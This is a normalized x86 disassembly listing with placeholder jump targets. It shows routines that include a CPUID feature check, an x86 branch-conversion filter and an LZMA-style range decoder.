cmp ecx 0x3
jbe r-xdata
mov eax [ ebp - 0x4 ]
inc edx
cmp edx ecx
jb r-xdata
mov eax [ ebp + 0xc ]
dec ecx
shl esi cl
and esi 0x7
mov [ eax ] esi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
xor esi esi
mov [ eax ] esi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
dec ecx
shl esi cl
and esi 0x7
je r-xdata
xor esi esi
mov al [ edx + 0x4 ]
mov ebx edi
mov [ ebp - 0x10 ] ebx
test al al
je r-xdata
movzx eax [ esi + r--data ]
mov ecx edx
sub ecx eax
cmp [ esi + r--data ] 0x0
mov al [ ecx + 0x4 ]
je r-xdata
movzx ecx [ edx + 0x3 ]
movzx eax al
shl eax 0x8
or eax ecx
movzx ecx [ edx + 0x2 ]
shl eax 0x8
or eax ecx
movzx ecx [ edx + 0x1 ]
shl eax 0x8
or eax ecx
lea ebx [ ebx ]
cmp al 0xff
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
and esi 0x3
add esi esi
mov ebx edi
or esi 0x1
inc edi
jmp r-xdata
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax ebx
shr eax 0x18
and al 0x1
dec al
not al
mov [ edx + 0x4 ] al
mov eax ebx
shr eax 0x10
mov [ edx + 0x3 ] al
mov eax ebx
shr eax 0x8
mov [ edx + 0x2 ] al
mov eax [ ebp - 0x4 ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
add edi 0x5
jmp r-xdata
movzx eax [ esi + r--data ]
shl eax 0x3
mov ecx 0x18
sub ecx eax
mov [ ebp - 0xc ] eax
mov eax ebx
shr eax cl
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
and esi 0x3
add esi esi
or esi 0x1
inc edi
jmp r-xdata
lea edx [ edi + eax ]
cmp edx ecx
jae r-xdata
cmp al 0xff
jne r-xdata
mov ecx 0x20
sub ecx [ ebp - 0xc ]
mov eax 0x1
shl eax cl
dec eax
xor eax ebx
jmp r-xdata
cmp al 0xff
jne r-xdata
sub eax edi
lea ebx [ eax - 0x5 ]
test esi esi
je r-xdata
sub_406270
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x40000
pushfd
pop eax
mov edx eax
xor eax [ ebp - 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x200000
pushfd
pop eax
mov edx eax
xor eax [ ebp - 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax 0x0
cpuid
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x8 ] eax
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax 0x1
cpuid
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0x1c ] eax
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_406350
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp dl 0x28
ja r-xdata
mov eax 0x4
pop esi
mov esp ebp
pop ebp
retn
jne r-xdata
movzx edx dl
mov ecx edx
shr ecx 0x1
and edx 0x1
add ecx 0xb
or edx 0x2
shl edx cl
or edx 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
mov eax edx
shr eax 0x8
mov [ ebp - 0x6 ] al
mov eax edx
mov [ ebp - 0x7 ] dl
shr edx 0x18
shr eax 0x10
mov [ ebp - 0x4 ] dl
push 0x5
lea edx [ ebp - 0x8 ]
mov ecx esi
mov [ ebp - 0x8 ] 0x4
mov [ ebp - 0x5 ] al
call sub_407eb0
add esp 0x8
pop esi
mov esp ebp
pop ebp
retn
sub_406420
push esi
mov esi ecx
mov eax [ esi + 0x78 ]
cmp eax 0x5
ja r-xdata
mov eax 0x9
pop esi
retn
jmp [ eax * 4 + jump_table_40652c ]
mov [ esi + 0x7c ] dl
test dl dl
jne r-xdata
movzx eax dl
shl eax 0x8
or [ esi + 0x74 ] eax
mov eax 0x2
pop esi
retn
movzx eax dl
or eax [ esi + 0x74 ]
mov ecx 0x6
inc eax
test [ esi + 0x7c ] 0x80
mov [ esi + 0x74 ] eax
mov eax 0x3
cmove eax ecx
pop esi
retn
movzx eax dl
shl eax 0x8
mov [ esi + 0x70 ] eax
mov eax 0x4
pop esi
retn
movzx eax dl
or eax [ esi + 0x70 ]
inc eax
mov [ esi + 0x70 ] eax
mov al [ esi + 0x7c ]
and al 0x60
cmp al 0x40
jb r-xdata
cmp dl 0xe1
jae r-xdata
js r-xdata
mov eax 0x8
pop esi
retn
cmp [ esi + 0x88 ] 0x0
mov eax 0x6
mov ecx 0x9
cmovne eax ecx
pop esi
retn
mov eax 0x5
pop esi
retn
movzx eax dl
cdq
push ebx
mov ebx 0x9
idiv ebx
push edi
mov ecx 0x5
movzx eax al
mov edi edx
cdq
idiv ecx
mov [ esi + 0x8 ] eax
lea ecx [ edx + edi ]
cmp ecx 0x4
jle r-xdata
movzx eax dl
and eax 0x1f
shl eax 0x10
mov [ esi + 0x74 ] eax
mov eax 0x1
pop esi
retn
and dl 0x7f
cmp dl 0x2
jbe r-xdata
mov [ esi ] edi
pop edi
pop ebx
mov [ esi + 0x4 ] edx
mov [ esi + 0x88 ] 0x0
mov eax 0x6
pop esi
retn
pop edi
mov eax ebx
pop ebx
pop esi
retn
mov [ esi + 0x74 ] 0x0
mov eax 0x1
pop esi
retn
sub_406550
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0xc ]
mov esi ecx
mov eax [ edx ]
cmp [ esi + 0x78 ] 0x8
mov ecx [ ebp + 0x14 ]
push edi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] eax
mov [ edx ] 0x0
mov [ ecx ] 0x0
je r-xdata
mov [ ecx ] 0x1
mov ebx [ ebp + 0x8 ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x6
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ edx ]
sub ecx edi
mov edi [ ebp - 0x4 ]
sub edi edx
mov edx [ esi + 0x74 ]
mov [ ebp - 0x8 ] 0x0
cmp edx ecx
ja r-xdata
cmp eax 0x7
je r-xdata
mov dl [ esi + 0x7c ]
test dl dl
js r-xdata
mov ecx edx
mov [ ebp - 0x8 ] 0x1
mov eax [ edx ]
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x4 ]
cmp [ eax ] esi
mov esi [ ebp - 0x18 ]
mov eax [ esi + 0x78 ]
je r-xdata
pop edi
pop esi
mov [ ecx ] 0x3
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ edx ] eax
mov dl [ ebx ]
mov ecx esi
call sub_406420
mov edx [ ebp + 0xc ]
mov [ esi + 0x78 ] eax
inc ebx
push [ ebp + 0x14 ]
cmp edi [ esi + 0x70 ]
push [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
cmova edi [ esi + 0x70 ]
lea eax [ ebp - 0xc ]
push eax
lea edx [ ecx + edx ]
push ebx
mov ecx esi
mov [ ebp - 0xc ] edi
call sub_407bc0
mov edi [ esi + 0x24 ]
mov ecx [ ebp - 0xc ]
sub edi [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
sub [ esi + 0x70 ] ecx
add [ edx ] ecx
sub [ esi + 0x74 ] edi
add esp 0x10
add ebx ecx
test eax eax
jne r-xdata
movzx eax dl
shr eax 0x5
xor edx edx
and eax 0x3
cmp eax 0x3
sete dl
mov [ ebp - 0xc ] edx
xor edx edx
test eax eax
mov eax [ ebp - 0xc ]
setg dl
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] 0x3
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x6
jne r-xdata
mov eax [ esi + 0x78 ]
mov edi [ esi + 0x24 ]
mov [ ebp - 0x10 ] edi
cmp eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
cmp eax 0x3
je r-xdata
test edx edx
jne r-xdata
cmp [ esi + 0x80 ] eax
jne r-xdata
cmp edi ecx
cmova edi ecx
test edi edi
je r-xdata
xor eax eax
cmp dl 0x1
sete al
test eax eax
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
mov [ esi + 0x4c ] 0x1
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x58 ] 0x0
test eax eax
je r-xdata
cmp [ esi + 0x84 ] edx
jne r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x24 ]
push edi
push ebx
push eax
call sub_41a1a0
add [ esi + 0x24 ] edi
add esp 0xc
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x80 ] 0x0
jne r-xdata
mov [ esi + 0x84 ] 0x1
mov [ esi + 0x88 ] 0x1
jmp r-xdata
cmp eax 0x4
jne r-xdata
test edi edi
jne r-xdata
test edx edx
je r-xdata
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x50 ] 0x1
add [ esi + 0x2c ] edi
sub [ esi + 0x74 ] edi
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
add [ edx ] edi
add ebx edi
neg eax
sbb eax eax
and eax 0x7
mov [ esi + 0x78 ] eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov eax ecx
sub eax [ esi + 0x2c ]
cmp eax edi
ja r-xdata
mov [ esi + 0x80 ] 0x0
mov [ esi + 0x4c ] 0x1
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x58 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x2
jmp r-xdata
cmp eax 0x4
jne r-xdata
mov [ esi + 0x80 ] 0x0
mov [ esi + 0x84 ] 0x0
mov [ esi + 0x78 ] 0x7
mov [ esi + 0x50 ] 0x1
mov [ esi + 0x30 ] ecx
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x50 ] 0x1
cmp [ esi + 0x78 ] 0x8
jne r-xdata
cmp [ esi + 0x74 ] edi
jne r-xdata
cmp [ esi + 0x70 ] edi
jne r-xdata
mov [ esi + 0x78 ] edi
sub_406820
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x38 ] edi
mov eax [ edi + 0x10 ]
mov ecx [ edi + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0x24 ] eax
mov eax [ edi + 0x3c ]
mov [ ebp - 0x2c ] eax
mov eax [ edi + 0x40 ]
mov [ ebp - 0x30 ] eax
mov eax [ edi + 0x44 ]
mov [ ebp - 0x3c ] eax
mov esi [ edi + 0x34 ]
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x4 ]
mov ebx [ edi + 0x18 ]
mov [ ebp - 0x50 ] edx
dec eax
mov edx [ edi + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x24 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
dec eax
mov [ ebp - 0x58 ] eax
mov eax [ edi ]
mov [ ebp - 0x48 ] eax
mov eax [ edi + 0x14 ]
mov [ ebp - 0x34 ] eax
mov eax [ edi + 0x28 ]
mov [ ebp - 0x28 ] eax
mov eax [ edi + 0x30 ]
mov edi [ edi + 0x1c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x1c ] edx
mov eax [ eax + 0x20 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] ebx
lea ebx [ ebx ]
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
mov [ esi ] dx
mov esi [ ebp - 0x10 ]
movzx edx [ ecx + esi * 2 + 0x180 ]
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi ] cx
mov esi [ ebp - 0xc ]
add esi 0xe6c
cmp [ ebp - 0x44 ] 0x0
mov [ ebp - 0x20 ] esi
jne r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x14 ]
test edx edx
mov ecx edx
cmove ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x34 ]
movzx esi [ ecx + edx - 0x1 ]
mov edx [ ebp - 0x1c ]
and edx [ ebp - 0x58 ]
mov ecx 0x8
sub cl [ ebp - 0x48 ]
shr esi cl
mov ecx [ ebp - 0x48 ]
shl edx cl
add esi edx
imul esi esi 0x600
add [ ebp - 0x20 ] esi
mov esi [ ebp - 0x20 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
cmp [ ebp - 0x44 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ ecx + esi * 2 + 0x180 ] dx
jne r-xdata
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
add esi 0xc
mov [ edx + esi * 2 + 0x168 ] cx
mov [ ebp - 0x10 ] esi
add edx 0x664
jmp r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x38 ]
sbb ecx ecx
and ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x24 ]
add ecx [ esi + 0x14 ]
cmp edx 0xa
mov esi 0x100
movzx ebx [ ecx + ebx ]
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x6
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] esi
mov edx 0x1
cmp edx 0x4
mov ecx 0x3
cmovb ecx edx
sub edx ecx
mov [ ebp - 0x10 ] edx
mov edx 0x1
lea ecx [ ecx ]
mov edx [ ebp - 0x10 ]
cmp edx 0x7
jae r-xdata
movzx esi [ ecx + esi * 2 + 0x198 ]
cmp edi 0x1000000
jae r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
movzx esi [ edx ]
cmp edi 0x1000000
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx esi
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
shl edi 0x8
or eax ecx
inc [ ebp - 0x4 ]
mov ecx edi
shr ecx 0xb
imul ecx esi
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov edx edi
shr edx 0xb
imul edx esi
cmp eax edx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
shr ecx 0xb
imul ecx esi
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
sub edi ecx
sub eax ecx
mov ecx esi
shr ecx 0x5
sub esi ecx
mov ecx [ ebp - 0x40 ]
lea edx [ edx * 2 + 0x1 ]
mov [ ecx ] si
mov edi ecx
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov esi [ ebp - 0x40 ]
add edx edx
mov [ esi ] cx
not ebx
jmp r-xdata
sub edi ecx
sub eax ecx
mov ecx esi
shr ecx 0x5
sub esi ecx
mov ecx [ ebp - 0x20 ]
inc edx
mov [ edx + ecx - 0x1 ] si
mov esi ecx
mov edi ecx
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov esi [ ebp - 0x20 ]
mov [ edx + esi ] cx
jmp r-xdata
mov ecx esi
shr ecx 0x5
sub esi ecx
mov ecx [ ebp - 0x10 ]
sub edi edx
sub eax edx
mov edx [ ebp - 0xc ]
mov [ edx + ecx * 2 + 0x198 ] si
mov esi ecx
movzx edx [ edx + esi * 2 + 0x1b0 ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0x10 ]
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov esi [ ebp - 0xc ]
mov edi edx
mov [ esi + ebx * 2 + 0x198 ] cx
lea ecx [ ebx + 0xf ]
shl ecx 0x4
add ecx [ ebp - 0x20 ]
lea ebx [ esi + ecx * 2 ]
movzx esi [ ebx ]
cmp edx 0x1000000
jae r-xdata
sub edi ecx
sub eax ecx
mov ecx esi
shr ecx 0x5
sub esi ecx
mov [ edx ] si
movzx esi [ edx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov [ edx ] cx
mov ecx [ ebp - 0x20 ]
shl ecx 0x4
add ecx 0x4
add ecx edx
mov [ ebp - 0x40 ] 0x0
mov esi 0x8
jmp r-xdata
add ebx ebx
mov [ ebp - 0x4c ] ebx
mov ebx esi
and ebx [ ebp - 0x4c ]
lea ecx [ ebx + esi ]
mov esi [ ebp - 0x20 ]
add ecx edx
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x40 ] ecx
movzx esi [ ecx ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0x14 ]
mov ecx [ ebp - 0x34 ]
inc ebx
mov [ ebx + ecx - 0x1 ] dl
mov edx [ ebp - 0x1c ]
inc edx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
and esi ebx
mov ebx [ ebp - 0x4c ]
mov [ ebp - 0x8 ] esi
cmp edx 0x100
jb r-xdata
add edx edx
movzx esi [ edx + esi ]
cmp edi 0x1000000
jae r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edx 0x100
jb r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
mov ecx edi
shr ecx 0xb
imul ecx esi
cmp eax ecx
jae r-xdata
mov edx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ edx ]
shl edi 0x8
or eax ecx
inc edx
mov [ ebp - 0x4 ] edx
mov ecx edi
shr ecx 0xb
imul ecx esi
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] ecx
mov edx 0x1
mov esi [ ebp - 0x10 ]
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + esi * 2 + 0x1b0 ] dx
movzx edx [ ecx + esi * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + esi * 2 + 0x1b0 ] cx
mov ecx [ ebp - 0x2c ]
jmp r-xdata
sub edi ecx
sub eax ecx
mov ecx esi
shr ecx 0x5
sub esi ecx
mov [ ebx ] si
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov edi ecx
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov [ ebx ] cx
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp - 0x24 ]
sbb ecx ecx
and ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x24 ]
add ecx ebx
inc ebx
mov cl [ ecx + edx ]
mov [ ebx + edx - 0x1 ] cl
mov edx [ ebp - 0x1c ]
inc edx
cmp [ ebp - 0x10 ] 0x7
mov [ ebp - 0x14 ] ebx
sbb esi esi
and esi 0xfffffffe
add esi 0xb
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x10 ] esi
jmp r-xdata
sub edi ecx
sub eax ecx
mov ecx esi
shr ecx 0x5
sub esi ecx
mov [ edx + 0x2 ] si
lea ecx [ edx + 0x204 ]
mov [ ebp - 0x40 ] 0x10
mov esi 0x100
mov edi ecx
mov ecx 0x800
sub ecx esi
shr ecx 0x5
add ecx esi
mov [ edx + 0x2 ] cx
mov ecx [ ebp - 0x20 ]
shl ecx 0x4
add ecx 0x104
add ecx edx
mov [ ebp - 0x40 ] 0x8
mov esi 0x8
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0xc ]
cmp esi 0x7
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0xb
mov [ ebp - 0x10 ] ecx
add edx 0xa68
cmp ebx [ ebp - 0x50 ]
jae r-xdata
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + ecx ] dx
mov edx [ ebp - 0x18 ]
inc edx
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0x20 ]
mov [ ebx + edx ] cx
mov ecx edx
mov edx ebx
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x18 ] edx
mov edx ecx
mov ecx [ ebp - 0x14 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x1c ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ edx + 0x1c ] edi
mov [ edx + 0x48 ] ebx
mov [ edx + 0x24 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x2c ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x30 ]
mov [ edx + 0x40 ] eax
pop edi
mov [ edx + 0x44 ] ecx
mov [ edx + 0x34 ] esi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx ecx [ edx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc edx
and edx [ ebp - 0x54 ]
mov ecx esi
shl ecx 0x4
add ecx edx
mov [ ebp - 0x20 ] edx
mov edx [ ebp - 0xc ]
lea esi [ edx + ecx * 2 ]
movzx edx [ esi ]
cmp edi 0x1000000
jae r-xdata
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + esi * 2 + 0x1c8 ] dx
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + esi * 2 + 0x1c8 ] cx
mov ecx [ ebp - 0x30 ]
jmp r-xdata
add edx edx
mov [ ebp - 0x18 ] edx
movzx edx [ edx + ecx ]
cmp edi 0x1000000
jae r-xdata
mov ecx [ ebp - 0x40 ]
sub ecx esi
add edx ecx
cmp [ ebp - 0x10 ] 0xc
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] edx
jb r-xdata
mov ebx [ ebp - 0x4 ]
cmp edx esi
jb r-xdata
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edx
mov esi [ ebp - 0x14 ]
mov ecx [ ebp - 0x50 ]
add edx 0x2
mov [ ebp - 0x18 ] edx
cmp ecx esi
je r-xdata
mov ebx [ ebp - 0xc ]
cmp edx 0x4
mov ecx 0x3
cmovb ecx edx
shl ecx 0x7
add ebx 0x360
add ebx ecx
movzx edx [ ebx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
sub ecx esi
cmp ecx edx
mov ebx edx
cmovb ebx ecx
cmp esi [ ebp - 0x24 ]
sbb edx edx
and edx [ ebp - 0x28 ]
add [ ebp - 0x1c ] ebx
sub edx [ ebp - 0x24 ]
sub [ ebp - 0x18 ] ebx
add edx esi
lea ecx [ edx + ebx ]
cmp ecx [ ebp - 0x28 ]
ja r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov esi [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ esi ]
or eax ecx
shl edi 0x8
inc esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x34 ]
mov edi [ ebp - 0x28 ]
lea ebx [ ebx ]
add esi [ ebp - 0x34 ]
sub edx [ ebp - 0x14 ]
add [ ebp - 0x14 ] ebx
lea ecx [ esi + ebx ]
mov [ ebp - 0x4c ] ecx
mov ebx ecx
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x2 ] dx
mov ecx 0x3
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ ebx + 0x2 ] cx
mov ecx 0x2
jmp r-xdata
mov cl [ edx + eax ]
inc edx
mov [ esi + eax ] cl
xor ecx ecx
inc esi
cmp edx edi
cmove edx ecx
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x14 ] esi
mov cl [ edx + esi ]
mov [ esi ] cl
inc esi
cmp esi ebx
jne r-xdata
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea esi [ ecx + ecx ]
movzx edx [ esi + ebx ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ esi + ebx ] dx
mov [ ebp - 0x8 ] eax
inc esi
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi + ebx ] cx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
add esi esi
movzx edx [ esi + ebx ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ esi + ebx ] dx
mov [ ebp - 0x8 ] eax
inc esi
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi + ebx ] cx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
add esi esi
movzx edx [ esi + ebx ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ esi + ebx ] dx
